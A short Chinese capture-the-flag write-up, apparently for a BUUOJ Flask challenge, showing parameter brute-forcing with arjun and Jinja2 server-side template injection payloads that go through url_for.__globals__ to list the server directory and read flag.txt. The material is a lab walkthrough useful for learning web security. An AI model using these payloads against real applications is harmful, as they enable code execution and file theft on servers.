![[Pasted image 20230118100150.png|500]]

---

![[Pasted image 20230118100135.png|1000]]

突出一个爆破.jpg

除了题目提示`flask`之外就没有其他信息了

尝试`dirsearch`目录爆破无果，发现一个爆破`query`的工具`arjun`

```shell
arjun -u http://xxx.node4.buuoj.cn:81/ -c 100 -d 0.1
```

![[Pasted image 20230118103413.png|1000]]

```
/?name=1
```

![[Pasted image 20230118103529.png|200]]

```
/?name={{7*7}}
```

![[Pasted image 20230118103559.png|200]]

利用`url_for`函数注入

```
/?name={{url_for.__globals__['__builtins__']['__import__']('os').listdir('.')}}
```

```python
['flag.txt', 'application.py', 'requirements.txt', 'static', 'templates']
```

```
/?name={{url_for.__globals__['__builtins__']['open']('flag.txt').read()}}
```

![[Pasted image 20230118104246.png|500]]

#Web #python #flask #SSTI #urlfor #arjun #参数爆破